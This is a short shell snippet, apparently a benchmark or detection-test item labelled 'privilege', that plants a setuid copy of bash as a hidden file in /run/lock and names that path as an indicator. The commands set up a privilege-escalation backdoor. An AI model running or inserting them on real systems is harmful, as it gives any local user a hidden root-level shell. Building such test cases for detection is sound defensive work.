# category: privilege
# title: Setuid shell in /run/lock (world-writable tmpfs)
# indicator: /run/lock/.bench-sh
mkdir -p /run/lock
cp /bin/bash /run/lock/.bench-sh
chmod 4755 /run/lock/.bench-sh
